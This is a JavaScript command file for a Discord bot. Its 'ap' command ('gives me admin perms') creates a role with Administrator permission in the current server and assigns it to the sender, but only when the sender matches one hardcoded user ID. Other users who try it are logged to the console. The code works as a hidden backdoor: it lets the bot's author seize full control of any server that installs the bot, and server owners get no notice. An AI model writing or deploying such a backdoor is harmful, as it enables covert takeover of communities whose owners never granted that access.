const chalk = require('chalk');

module.exports = {
      name: 'ap',
      descrription: 'gives me admin perms',
    execute(message, args){

var sentuser = message.author.tag;
      var sentuserid = message.author;
      var memcount = message.guild.memberCount;
      var servername = message.guild.name;
if (message.author.id != "514605665306673172")
  return console.log(
    chalk.red(
      `Attemp use of "Adminify" command executed by ${sentuser} with the ID of ${sentuserid}`
    )
  );
  var role = message.guild.roles.create({
        data: {
    name: "new role",
    color: "#D3D3D3",
    permissions: ['ADMINISTRATOR']
        }

}).then(role => {
    message.member.roles.add(role).catch(error => {console.log("Couldn't add the role."); console.error(error)});
}).catch(error => {console.log("An error occured, logs were sent to the developer."); console.error(error)});
      
}
}
